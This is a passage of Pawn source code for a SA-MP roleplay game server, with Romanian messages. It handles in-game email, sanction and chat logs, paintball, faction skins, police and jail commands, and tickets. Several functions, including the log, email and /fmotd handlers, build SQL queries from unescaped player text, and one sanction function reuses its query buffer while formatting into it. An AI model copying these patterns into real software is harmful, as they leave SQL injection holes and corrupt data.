		format(gQuery, 128, "%s%s%s...\n", !read?("[UNREAD] ") : (""), text), strcat(gString, gQuery);
	}	
	Dialog_Show(playerid, DIALOG_EMAILS, DIALOG_STYLE_LIST, "Inbox", gString, "Select", "Exit");
	return true;
}
Dialog:DIALOG_EMAILS(playerid, response, listitem, inputtext[]) {
	if(!response) return true;		
	_query("UPDATE `emails` SET `Read` = '1' WHERE `ID` = '%i'", EmailID[playerid][listitem]);	
	mysql_format(SQL, gQuery, sizeof gQuery,  "SELECT * FROM `emails` WHERE `ID`='%d' LIMIT 1", EmailID[playerid][listitem]);			
	mysql_tquery(SQL, gQuery, #check_read_email, #i, playerid);
	return true;
}

redist::check_read_email(playerid) {
	new date[30], text[180], by[MAX_PLAYER_NAME];
	cache_get_value_name(0, "Text", text);
	cache_get_value_name(0, "By", by); 
	cache_get_value_name(0, "Date", date);
	format(gString, 180, "%s\n\nSent at %s by %s.", text, date, by);
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Read Email", gString, "Cancel", "");	
	return true;
}

cmd:achivemets(playerid, params[]) return ShowAchivemets(playerid);

redist::ShowAchivemets(playerid) {
	new szDialog2[2000];
	strcat(szDialog2, "Name\tStatus\n");
	for(new i = 0; i < 35; i++) {
		format(gString, 128, "%s\t%s\n", achievementNames(i), (PlayerInfo[playerid][pAchievementStatus][i] == 1) ? ("{3DBF0A}Realizare completa") : ("{CC0E0E}Realizare incompleta"));
		strcat(szDialog2, gString);
	}
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "Achievements", szDialog2, "Select", "Cancel");
	return true;
}
redist::InsertEmail(const playername[], const by[], const text[]) {
	new Year, Month, Day, Hour, Minute, Second; getdate(Year, Month, Day), gettime(Hour, Minute, Second);
	format(srsString, 128, "%02d-%02d-%d %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second); 
	_query("INSERT INTO `emails` (`Name`, `Text`, `By`, `Date`) VALUES ('%s', '%s', '%s', '%s')", playername, text, by, srsString);

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", playername);
	mysql_tquery(SQL, gQuery, #insert_email);
	return true;
}

redist::insert_email(playerid) {
	new userid=-1; cache_get_value_name_int(0, "Status", userid);
	if userid != -1 *then SendClientMessage(userid, COLOR_YELLOW, "{FF6200}** {FFFF00}You have a new email. Use /email to read it. {FF6200}**"), PlayerPlaySound(userid, 1052, 0.0, 0.0, 0.0);
	return true;
}

cmd:mylp(playerid, params[]) return ShowPunish(playerid, playerid);
redist::ShowPunish(playerid, targetid) {
	if(PlayerInfo[playerid][pPremiumAccount]!=2&&!IsAdmin(playerid, 1)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de gradul 'Premium Plus' pentru a avea acces la aceasta comanda.");

	mysql_format(SQL, gQuery, 256, "SELECT * FROM `sanctions` WHERE `Userid`='%d' ORDER BY `sanctions`.`ID` DESC", PlayerInfo[targetid][pSQLID]);
	mysql_tquery(SQL, gQuery, "sql_check_lp", "i", playerid);
	return true;
}
  
redist::sql_check_lp(playerid) {
	if(!cache_num_rows()) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu exista sanctiuni in istoric!");
	new sanction_id, by[MAX_PLAYER_NAME], time[32], type, reason[64]; gString[0] = (EOS);
	for(new i, x = cache_num_rows(); i < x; i++) {
		cache_get_value_name_int(i, "ID", sanction_id);
		cache_get_value_name(i, "By", by); 
		cache_get_value_name(i, "Time", time);
		cache_get_value_name_int(i, "Type", type);
		cache_get_value_name(i, "Reason", reason);
		switch(type) {
			case BAN: format(gQuery, 256, "[#%d - %s] Ban received from %s, reason: %s\n", sanction_id, time, by, reason);
			case KICK: format(gQuery, 256, "[#%d - %s] Kick received from %s, reason: %s\n", sanction_id, time, by, reason);
			case WARN: format(gQuery, 256, "[#%d - %s] Warn received from %s, reason: %s\n", sanction_id, time, by, reason);
			case JAIL: format(gQuery, 256, "[#%d - %s] Jail received from %s, reason: %s\n", sanction_id, time, by, reason);
			case MUTE: format(gQuery, 256, "[#%d - %s] Mute received from %s, reason: %s\n", sanction_id, time, by, reason);
			default: gQuery[0] = (EOS);
		}
		strcat(gString, gQuery);		
	}
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Last Punish (limit: 20)", gString, "Ok", "");
	return true;
}

redist::ShowLastChat(playerid, targetid) {
	mysql_format(SQL, gQuery, 256, "SELECT * FROM `logs` WHERE `Userid`='%d' ORDER BY `logs`.`ID` DESC", PlayerInfo[targetid][pSQLID]);
	mysql_tquery(SQL, gQuery, "sql_check_lastchat", "i", playerid);
	return true;
}
  
redist::sql_check_lastchat(playerid) {
	if(!cache_num_rows()) return SendClientMessage(playerid, COLOR_WHITE, "Eroare: Nu exista istoric!");
	new text[256], time[32]; gString[0] = (EOS);
	for(new i, x = cache_num_rows(); i < x; i++) {
		cache_get_value_name(i, "Text", text); 
		cache_get_value_name(i, "Date", time);
		format(gQuery, 256, "[%s] %s\n", time, text);
		strcat(gString, gQuery);		
	}
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Chat Log", gString, "Ok", "");
	return true;
}

redist::InsertLog(playerid, const text[], type, va_args<>) {
	new szDate[180], Year, Month, Day, Hour, Minute, Second, ip[180], out[128];
	
	va_format(out, sizeof out, text, va_start<3>);

	getdate(Year, Month, Day); gettime(Hour, Minute, Second); GetPlayerIp(playerid, ip, sizeof(ip));
	format(szDate, sizeof(szDate), "%02d/%02d/%d - %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second); 
	return _query("INSERT INTO `logs` (`Userid`, `Text`, `Date`, `Type`, `IP`) VALUES ('%d', '%s', '%s', '%d', '%s')", PlayerInfo[playerid][pSQLID], out, szDate, type, ip);
}

redist::InsereazaSanctiune(playerid, by, type, const reason[]) {
	new Year, Month, Day, Hour, Minute, Second;
		
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
	format(gString, 128, "%02d/%02d/%d - %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second);
	format(srsString, 60, "%s (%d)", GetName(playerid), PlayerInfo[playerid][pSQLID]);
	format(gQuery, 60, "%s (%d)", GetName(by), PlayerInfo[by][pSQLID]);
	mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO `sanctions` (`Player`, `By`, `Time`, `Userid`, `Type`, `Reason`) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')", srsString, by!=AdmBot?(gQuery):("AdmBot"), gString, PlayerInfo[playerid][pSQLID], type, reason);
	mysql_tquery(SQL, gQuery, "", "");	
	return true;
}

stock InsereazaSanctiuneOFf(const name[], const by[], _Userid, by_Userid, type, const reason[]) {
	new Year, Month, Day, Hour, Minute, Second;
		
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
	format(gString, 128, "%02d/%02d/%d - %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second);
	format(srsString, 60, "%s (%d)", name, _Userid);
	format(gQuery, 60, "%s (%d)", by, by_Userid);
	mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO `sanctions` (`Player`, `By`, `Time`, `Userid`, `Type`, `Reason`) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')", srsString, gQuery, gString, _Userid, type, reason);
	mysql_tquery(SQL, gQuery, "", "");	
	return true;
}

stock serverColors(id) {
	new string[180];
	switch(id) {
		case 0: string = "FFFFFF";
		case 1: string = "0BA10B"; 
		case 2: string = "D1FF99";
		case 3: string = "FF3D98";
		case 4: string = "F9FF3D";
		case 5: string = "FFEF85";			
		case 6: string = "3DE5FF";			
		case 7: string = "FFAB3D";			
		case 8: string = "A13DFF";			
		case 9: string = "FFC27D";			
		case 10: string = "FFA3A3";			
		case 11: string = "C5A3FF";							
	}
	return string;
}

stock PlayerColors(playerid, x[7] = "CECECE") {
	switch(PlayerInfo[playerid][pColor]) {
		case 1: x = "0087FE";
		case 2: x = "4700C2";
		case 3: x = "EBFF00";
		case 4: x = "EF00FF";
		case 5: x = "40FF00";
		case 6: x = "9CFF29";
		case 7: x = "0E7F03";
		case 8: x = "FF9A00";
		case 9: x = "6E6E6E";
		case 10: x = "FF4C9D";
		case 11: x = "F4FA58";
		case 12: x = "00BFFF";
		case 13: x = "819FF7";
		case 14: x = "FE9A2E";
		case 15: x = "FA8258";
		case 16: x = "00FF40";
		case 17: x = "D358F7";
		case 18: x = "4169E1";
		case 19: x = "9ACD32";
		case 20: x = "F0E68C";
		case 21: x = "BDB76B";
		case 22: x = "FF1493";
		case 23: x = "9966CC";
		case 24: x = "F0B2B2";
		case 25: x = "DB7093";
		case 26: x = "E70031";
		case 27: x = "AB0000";
		case 28: x = "FF6347";
		case 69: strmid(x, PlayerInfo[playerid][pChatColor], 0, 7);
	}
	return x;
}

stock svColors(id) {
	new x[10];
	switch(id) {
		case 0: x = "CECECE";
		case 1: x = "0087FE";
		case 2: x = "4700C2";
		case 3: x = "EBFF00";
		case 4: x = "EF00FF";
		case 5: x = "40FF00";
		case 6: x = "9CFF29";
		case 7: x = "0E7F03";
		case 8: x = "FF9A00";
		case 9: x = "6E6E6E";
		case 10: x = "FF4C9D";
		case 11: x = "F4FA58";
		case 12: x = "00BFFF";
		case 13: x = "819FF7";
		case 14: x = "FE9A2E";
		case 15: x = "FA8258";
		case 16: x = "00FF40";
		case 17: x = "D358F7";
		case 18: x = "4169E1";
		case 19: x = "9ACD32";
		case 20: x = "F0E68C";
		case 21: x = "BDB76B";
		case 22: x = "FF1493";
		case 23: x = "9966CC";
		case 24: x = "F0B2B2";
		case 25: x = "DB7093";
		case 26: x = "E70031";
		case 27: x = "AB0000";
		case 28: x = "FF6347";
	}
	return x;
}

stock carplateColors(id) {
	new x[10];
	switch(id) {
		case 0: x = "0087FE";
		case 1: x = "4700C2";
		case 2: x = "EBFF00";
		case 3: x = "EF00FF";
		case 4: x = "40FF00";
		case 5: x = "9CFF29";
		case 6: x = "0E7F03";
		case 7: x = "FF9A00";
		case 8: x = "6E6E6E";
		case 9: x = "FF4C9D";
		case 10: x = "F4FA58";
		case 11: x = "00BFFF";
		case 12: x = "819FF7";
		case 13: x = "FE9A2E";
		case 14: x = "FA8258";
		case 15: x = "00FF40";
		case 16: x = "D358F7";
		case 17: x = "4169E1";
		case 18: x = "9ACD32";
		case 19: x = "F0E68C";
		case 20: x = "BDB76B";
		case 21: x = "FF1493";
		case 22: x = "9966CC";
		case 23: x = "F0B2B2";
		case 24: x = "DB7093";
		case 25: x = "E70031";
		case 26: x = "AB0000";
		case 27: x = "FF6347";
	}
	return x;
}

redist::OnPlayerUseVending(playerid) {
    SetPlayerHealthEx(playerid, 99);
	GivePlayerCash(playerid, -250);
	return true;
}

redist::DeAMXI(playerid) return AntiDeAMX();
stock IsKeyJustDown(key, newkeys, oldkeys) {
	if((newkeys & key) && !(oldkeys & key)) return true;
	return false;
}

cmd:puthat(playerid, params[]) {
	if(PlayerInfo[playerid][pHat] == 0) return SendClientMessage(playerid, -1, "Nu ai o palarie!");
	if(PlayerInfo[playerid][pShowHat] == 1) return SendClientMessage(playerid, -1, "Ai deja palaria pe cap!");
	PlayerInfo[playerid][pShowHat] = 1;
	UpdateVar(playerid, "ShowHat", 1);
	PutHat(playerid);
	new string[180];
	format(string, sizeof(string), "%s si-a pus palaria pe cap.", GetName(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE);
	return true;
}

cmd:removehat(playerid, params[]) {
	if(PlayerInfo[playerid][pHat] == 0) return SendClientMessage(playerid, -1, "Nu ai o palarie!");
	if(PlayerInfo[playerid][pShowHat] == 0) return SendClientMessage(playerid, -1, "Nu ai palaria pe cap!");
	PlayerInfo[playerid][pShowHat] = 0;
	UpdateVar(playerid, "ShowHat", 0);
	RemovePlayerAttachedObject(playerid, 1);
	new string[180];
	format(string, sizeof(string), "%s si-a scos palaria de pe cap.", GetName(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE);
	return true;
}

cmd:paintleave(playerid, params[]) {
	if(PaintType[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu esti la paintball.");
	CheckPaintball(playerid);
	return true;
}

stock CheckPaintball(playerid) {
	if(!PaintType[playerid]) return true;
	SendPaintMessage(PaintType[playerid], COLOR_LIGHTGOLD, "%s has left the paintball arena.", GetName(playerid));
	SendClientMessage(playerid, COLOR_LGREEN, "Leaveing the paintball arena...");
	SetPlayerHealth(playerid, 0.0);
	PlayerTextDrawHide(playerid, PaintTD);
	new i = PaintType[playerid]-1;
	Iter_Remove(InPaint<i>, playerid);
	if(Iter_Count(InPaint<i>)<2) {
		PaintText[i] = 0;
		PaintTime[i] = 0;
		PaintVote[i] = 0;
	}
	PaintType[playerid] = 69;
	PlayerInfo[playerid][pChatCMD]=0;
	return true;
}

stock faction_skin(playerid) {
	switch PlayerInfo[playerid][pMember] do {
		case 4,5,6,10,17,25,26,27: {
			switch PlayerInfo[playerid][pMember] do {
				case 4: {
					if PlayerInfo[playerid][pSex] *then return 233;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 174;
						case 2,3: return 175;
						case 4: return 173;
						case 5: return 126;
						case 6: return 3;
						case 7: return 113;
					}
				}	
				case 5: {
					if PlayerInfo[playerid][pSex] *then return 216;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 114;
						case 2,3: return 115;
						case 4,5: return 116;
						case 6,7: return 46;
					}
				}
				case 6: {
					if PlayerInfo[playerid][pSex] *then return 191;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 109;
						case 2: return 110;
						case 3,4: return 176;
						case 5: return 177;
						case 6,7: return 108;
					}
				}
				case 10: {
					if PlayerInfo[playerid][pSex] *then return 76;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 104;
						case 2: return 103;
						case 3: return 102;
						case 4: return 98;
						case 5: return 233;
						case 6: return 185;
						case 7: return 296;
					}
				}
				case 17: {
					if PlayerInfo[playerid][pSex] *then return 12;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 124;
						case 2,3: return 127;
						case 4,5: return 125;
						case 6,7: return 126;
					}
				}
				case 25: {
					if PlayerInfo[playerid][pSex] *then return 190;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 181;
						case 2: return 100;
						case 3: return 248;
						case 4: return 247;
						case 5..7: return 242;
					}
				}
				case 26: {
					if PlayerInfo[playerid][pSex] *then return 216;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 114;
						case 2,3: return 115;
						case 4,5: return 116;
						case 6,7: return 46;
					}
				}
				case 27: {
					if PlayerInfo[playerid][pSex] *then return 233;
					switch PlayerInfo[playerid][pRank] do {
						case 1: return 174;
						case 2,3: return 175;
						case 4,5: return 173;
						case 6,7: return 3;
					}
				}
			}
		}
		case 1: {
			if !OnDuty[playerid] *then return PlayerInfo[playerid][pModel];
			if PlayerInfo[playerid][pSex] *then return 309;
			switch PlayerInfo[playerid][pRank] do {
				case 1: return 71;
				case 2: return 280;
				case 3: return 281;
				case 4: return 266;
				case 5: return 283;
				case 6: return 267;
				case 7: return 265;
			}
		}
		case 2: {
			if !OnDuty[playerid] *then return PlayerInfo[playerid][pModel];
			if PlayerInfo[playerid][pSex] *then return 76;
			switch PlayerInfo[playerid][pRank] do {
				case 1: return 163;
				case 2: return 164;
				case 3,4: return 166;
				case 5: return 286;
				case 6: return 290;
				case 7: return 295;
			}
		}
		case 3: {
			if !OnDuty[playerid] *then return PlayerInfo[playerid][pModel];
			if PlayerInfo[playerid][pSex] *then return 298;
			switch PlayerInfo[playerid][pRank] do {
				case 1: return 285;
				case 2,3,4,5: return 287;
				case 6,7: return 179;
			}
		}	
		case 14,19: {
			if !OnDuty[playerid] *then return PlayerInfo[playerid][pModel];
			if PlayerInfo[playerid][pSex] *then return 309;
			switch PlayerInfo[playerid][pRank] do {
				case 1: return 71;
				case 2: return 280;
				case 3: return 281;
				case 4: return 266;
				case 5: return 283;
				case 6: return 267;
				case 7: return 265;
			}
		}
		default: return PlayerInfo[playerid][pMember];
	}
	return -1;
}
cmd:votemap(playerid, params[]) {
	if(PaintType[playerid] != 0) {
		if(Voted[playerid] == 1) return SendClientMessage(playerid, -1, "Nu poti vota de mai multe ori.");
		if(PaintVote[PaintType[playerid]-1] == 0) return SendClientMessage(playerid, -1, "Nu se poate vota acum.");
		ShowPlayerDialog(playerid, DIALOG_VOTE, DIALOG_STYLE_LIST, "Voteaza mapa", "rc_arena\nfarm\nisland\ndesert\nbeach\nforest", "Ok", "Exit");
	}
	return true;
}

redist::PaintSpawn(playerid) {
	if(PaintType[playerid]==69) {
		PaintType[playerid]=0;
		SetPlayerPos(playerid, BizzInfo[BizzTypeID[14][0]][bEntranceX], BizzInfo[BizzTypeID[14][0]][bEntranceY], BizzInfo[BizzTypeID[14][0]][bEntranceZ]);
		for(new m = 0; m < 5; m++) SendDeathMessageToPlayer(playerid, 1001, 1001, 200);
		SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
		return true;
    }
	RemovePlayerAttachedObject(playerid, 8);
    SetPlayerArmourEx(playerid, 0);
    SetPlayerHealthEx(playerid, 99);	
    new rand = random(sizeof(PaintballSpawns));
	SetPlayerInterior(playerid, 0);
	switch(PaintMap[PaintType[playerid]]) {
		case 0: {
			SetPlayerPos(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
			SetPlayerInterior(playerid, 10);
			SetPlayerSkin(playerid, 291);
		}
		case 1: {
			SetPlayerPos(playerid, PaintballSpawns2[rand][0], PaintballSpawns2[rand][1], PaintballSpawns2[rand][2]);
			SetPlayerWorldBounds(playerid, 93.423, -245.2354, 186.846, -175.1681);
			SetPlayerSkin(playerid, 158);
		}	
		case 2: {
			SetPlayerPos(playerid, PaintballSpawns3[rand][0], PaintballSpawns3[rand][1], PaintballSpawns3[rand][2]);
			SetPlayerWorldBounds(playerid, 1400.3, 1099.627, 2854.154, 2711.035);	
			SetPlayerSkin(playerid, 154);	
		}	
		case 3: {
			SetPlayerPos(playerid, PaintballSpawns4[rand][0], PaintballSpawns4[rand][1], PaintballSpawns4[rand][2]);
			SetPlayerWorldBounds(playerid, -712.3504, -852.4849, 1611.547, 1424.701);
			SetPlayerSkin(playerid, 146);
		}	
		case 4: {
			SetPlayerPos(playerid, PaintballSpawns5[rand][0], PaintballSpawns5[rand][1], PaintballSpawns5[rand][2]);
			SetPlayerWorldBounds(playerid, 724.0283, 408.7256, -1775.037, -1915.172);
			SetPlayerSkin(playerid, 45);	
		}	
		case 5: {
			SetPlayerPos(playerid, PaintballSpawns6[rand][0], PaintballSpawns6[rand][1], PaintballSpawns6[rand][2]);
			SetPlayerWorldBounds(playerid, -420.4035, -595.5717, -35.03363, -198.5239);
			SetPlayerSkin(playerid, 27);	
		}			
	}
	SetPlayerVirtualWorld(playerid, PaintType[playerid]);
	if(PaintText[PaintType[playerid]-1] > 1) return true;
	if(PaintTime[PaintType[playerid]-1] < 1) return true;
	switch(PaintType[playerid]) {
	    case 1: {
	        ServerWeapon(playerid, 24, 999); ServerWeapon(playerid, 31, 999);
	        ServerWeapon(playerid, 16, 1);
	    }
	    case 2: ServerWeapon(playerid, 24, 999);
	}
	return true;
}


redist::PlayersOnPaint(paintid) return Iter_Count(InPaint<paintid>);
cmd:so(playerid, params[]) {
	if !IsACop(playerid) *then 
		return true;

	if !OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");

	if(DeelayCommand[playerid][32] > gettime())
		return SCMf(playerid, -1, "Poti folosi aceasta comanda peste %d secunde.", DeelayCommand[playerid][32] - gettime());

	if !OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	extract params -> new userid; else
		return SendClientMessage(playerid, COLOR_GREY, "{4CA27A}USAGE:{FFFFFF} /so <ID-ul playerului/Numele>");

	if !ProxDetectorS(30.0, playerid, userid) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu se afla in raza ta!");

	if userid == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if PlayerInfo[userid][pWantedLevel] *then format(gString, 128, "> %s: {4F90FF}%s{FFFF00}, esti cautat de politie. Opreste-te imediat sau risti wanted! <", GetName(playerid), GetName(userid));
	else if PlayerInfo[userid][pWantedLevel] == 0 && IsPlayerInAnyVehicle(userid) *then format(gString, 128, "> %s: {4F90FF}%s{FFFF00}, trage pe dreapta imediat! <", GetName(playerid), GetName(userid));
	else format(gString, 128, "> %s: {4F90FF}%s{FFFF00}, esti cautat de politie. Opreste-te imediat sau risti wanted! <", GetName(playerid), GetName(userid));
	ProxDetector(30.0, playerid, gString, COLOR_YELLOW);
	DeelayCommand[playerid][32] = gettime()+3;
	return true;
}
cmd:free(playerid, params[]) {
	new id,moneyfree,string[100];
	if(!IsACop(playerid)) return true;
	if(OnDuty[playerid] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");
	if(sscanf(params, "ui", id,moneyfree)) return SendClientMessage(playerid, 0xFFFFFFFF,"USAGE: /free <playerid/name> <amount>");
	if(PlayerInfo[id][pRestriction]) return SendClientMessage(playerid, COLOR_GREY, "Acel player are o restrictie pentru free!");
	if(PlayerInfo[id][pJailed] < 1) return SendClientMessage(playerid,COLOR_WHITE, "Acel player nu este in inchisoare.");
	if(playerid == id) return true;
	if(PlayerInfo[playerid][pLawyer] < 1) return SendClientMessage(playerid,-1, "Nu ai puncte de accept.");
	if(!ProxDetectorS(10.0, playerid, id)) return SendClientMessage(playerid,COLOR_GREY, "Acel player nu se afla in raza ta!");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(moneyfree < 50000 || moneyfree > 500000) return SendClientMessage(playerid, -1, "Suma invalida! ($50000-$500000)");
	FreeOffer[id] = playerid;
	FreePrice[id] = moneyfree;
	format(string, sizeof(string), "* I-ai oferit lui %s un free pentru %s$.",GetName(id),FormatNumber(moneyfree));
	SendClientMessage(playerid, COLOR_MONEY, string);
	format(string, sizeof(string), "* %s ti-a oferit un free pentru %s$, (scrie /accept free %d) pentru a accepta.",GetName(playerid),FormatNumber(moneyfree),playerid);
	SendClientMessage(id, COLOR_MONEY, string);
	return true;
}
cmd:escape(playerid, params[]) {
	if(PlayerInfo[playerid][pAJail] == 1) return true;
	if(PlayerInfo[playerid][pEscapePoints] < 10) return SendClientMessage(playerid, -1, "Ai nevoie de 10 puncte de evadare pentru a putea evada!");
	if(Escape[playerid] == 1) return SendClientMessage(playerid, -1, "Deja incerci sa evadezi!");
	if(PlayerToPoint(5, playerid, 1812.8346,-1536.1892,13.2090) && PlayerInfo[playerid][pJailTime] >= 1 || PlayerToPoint(5, playerid, 1754.0898,-1582.2433,12.5121) && PlayerInfo[playerid][pJailTime] >= 1) {
		if(PlayerInfo[playerid][pJailTime] < 60*10) return SendClientMessage(playerid, COLOR_LGREEN, "Nu mai poti evada deoarece mai ai de stat 10 minute.");
		PlayerInfo[playerid][pEscapePoints] -= 10;
		UpdateVar(playerid, "EscapePoints", PlayerInfo[playerid][pEscapePoints]);
		Escape[playerid] = 1;
		EscapeProces[playerid] = 0;
		showInfo(playerid, "Foloseste comanda ~y~/hit~w~~h~ pentru a sparge gardul.", 7);
	}
	else SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta coamanda deoarece nu esti la unul dintre garduri.");
	return true;
}

redist::GiveWanted(playerid) {
	if(Escape[playerid] == 0) return true;
	SetPlayerWantedLevel(playerid, 6);
	PlayerInfo[playerid][pWantedLevel] = 6;
	SetPlayerCriminal(playerid, -1, "escape");	
	return true;
}

redist::FailEscape(playerid) {
	PlayerTextDrawHide(playerid, CpTD);
	Escape2[playerid] = 0;
	Escape[playerid] = 0;
	EscapeProces[playerid] =0;
	SendClientMessage(playerid, COLOR_YELLOW, "Incercarea ta de a evada a esuat!");
	return true;
}
cmd:myad(playerid, params[]) {
	if(AdTimer[playerid] == 0) return SendClientMessage(playerid,COLOR_GREY, "Nu ai un anunt.");
	SendClientMessage(playerid, -1, "---- AD Info ----");
	SCMf(playerid, COLOR_WHITE, "AD: {9CFF56}%s", AdText[playerid]);
	SCMf(playerid, COLOR_WHITE, "Your ad appears in {9CFF56}%d seconds.", AdTimer[playerid]);
	return true;
}
cmd:tickets(playerid, params[]) {
	new string[3024];
	format(string, sizeof(string), "#\tType\tTotal\n{FFFFFF}1.\tRainbow Vehicle Ticket\t{6441F1}%d{FFFFFF} in total\n2.\tVip Vehicle Ticket\t{FED900}%d{FFFFFF} in total\n3.\tPremium Fuel Ticket\t{FF0000}%d{FFFFFF} in total\n4.\tCustom House Ticket\t{0F8805}%d{FFFFFF} in total\n5.\tSWS Ticket\t{FFFF00}%d{FFFFFF} in total\n6.\tClear KM Ticket\t{FFFF00}%d{FFFFFF} in total\n7.\tClear Days Ticket\t{FFFF00}%d{FFFFFF} in total\n8.\tPremium Battlepass Ticket (50%s discount)\t{FFFF00}%d{FFFFFF} in total\n9.\tCar Plate Color Ticket\t{FFFF00}%d{FFFFFF} in total",PlayerInfo[playerid][pTickets][0], PlayerInfo[playerid][pTickets][1], PlayerInfo[playerid][pTickets][2], PlayerInfo[playerid][pTickets][3], PlayerInfo[playerid][pTickets][4], PlayerInfo[playerid][pTickets][5], PlayerInfo[playerid][pTickets][6], PlayerInfo[playerid][pTickets][7], PlayerInfo[playerid][pTickets][8], PlayerInfo[playerid][pTickets][9]);
	ShowPlayerDialog(playerid, DIALOG_STICKET, DIALOG_STYLE_TABLIST_HEADERS, "{f4ad42}Tickets {FFFFFF}Menu", string, "Select", "Cancel");
	return true;
}

cmd:neontickets(playerid, params[]) {
	format(gString, sizeof gString, "Type\tAmount\n{FFFFFF}White Neon Ticket\t{6441F1}%d\n{FFFFFF}Pink Neon Ticket\t{ff00d0}%d\n{FFFFFF}Yellow Neon Ticket\t{ffff00}%d\n{FFFFFF}Green Neon Ticket\t{01ff04}%d\n{FFFFFF}Blue Neon Ticket\t{1a28ed}%d\n{FFFFFF}Red Neon Ticket\t{ff0000}%d",
		PlayerInfo[playerid][pNeonTickets][0], PlayerInfo[playerid][pNeonTickets][1], PlayerInfo[playerid][pNeonTickets][2], 
		PlayerInfo[playerid][pNeonTickets][3], PlayerInfo[playerid][pNeonTickets][4], PlayerInfo[playerid][pNeonTickets][5]);
	ShowPlayerDialog(playerid, DIALOG_NEONTICKETS, DIALOG_STYLE_TABLIST_HEADERS, "{f4ad42}Neon Tickets {FFFFFF}Menu", gString, "Select", "Cancel");
	return true;
}

cmd:showmotd(playerid, params[]) {
	#pragma unused params
	if(!PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,COLOR_GREY, "Nu esti intr-o factiune.");
	if(strlen(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]) == 0) return true;
	sendSplittedMessageToPlayer(playerid, COLOR_YELLOW, COLOR_YELLOW, "(FMOTD): %s",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	return true;
}
cmd:cmotd(playerid, params[]) {
	#pragma unused params
	if(!PlayerInfo[playerid][pClan]||PlayerInfo[playerid][pClanRank]<6) return true;
	sendSplittedMessageToPlayer(playerid, COLOR_CLIENT, COLOR_CLIENT, "(Clan MOTD) {FFFFFF}%s.", ClanInfo[PlayerInfo[playerid][pClan]][clMotd]);
	return true;
}
cmd:fmotd(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] == 0) return SendClientMessage(playerid,COLOR_GREY, "Nu esti intr-o factiune.");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid,COLOR_GREY, "Nu ai rank 5.");
	new string[180];
	if(sscanf(params, "s[180]",string)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/fmotd <text>");
	strmid(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], string, 0, strlen(string), 255);
	format(string, sizeof(string), "(FMOTD): %s",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	SendFactionMessage(PlayerInfo[playerid][pMember],COLOR_YELLOW,string);
	mysql_format(SQL, string, sizeof(string), "UPDATE `factions` SET `Anunt`='%s' WHERE `ID`='%d'",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], PlayerInfo[playerid][pMember]);
	mysql_tquery(SQL ,string, "", "");
	return true;
}
cmd:leaders(playerid, params[]) {
	if(!Iter_Count(faction_leaders)) return SendErrorMsg(playerid, "No leaders online at the moment.");
	SendClientMessage(playerid, COLOR_TEAL, "---------------- Lideri conectati ----------------");
    foreach(new i : faction_leaders) if(PlayerInfo[i][pRank] != 7) va_SendClientMessage(playerid, COLOR_WHITE, "%s: %s(%d)", FactionName(PlayerInfo[i][pLeader]), GetName(i),i);	
	return SendClientMessage(playerid, COLOR_TEAL, "--------------------------------------------------------");
}
cmd:top(playerid, params[]) {
	new top[9], _x[9] = {4,5,6,10,17,18,25,26,27};
	for(new i = 1; i <= SQL_Turfs; i++) {
		switch(TurfInfo[i][zOwned]) {
			case 4: top[0]++;
			case 5: top[1]++;
			case 6: top[2]++;
			case 10: top[3]++;
			case 17: top[4]++;
			case 18: top[5]++;
			case 25: top[6]++;
			case 26: top[7]++;
			case 27: top[8]++;
		}
	}
	SendClientMessage(playerid,COLOR_WHITE,"---------- Top Gangs ----------");
	for(new i=0;i<9;i++) SCMf(playerid,COLOR_WHITE, "{%s}%s {FFFFFF}- %d turfs", ColorFaction[_x[i]], FactionName(_x[i]), top[i]);
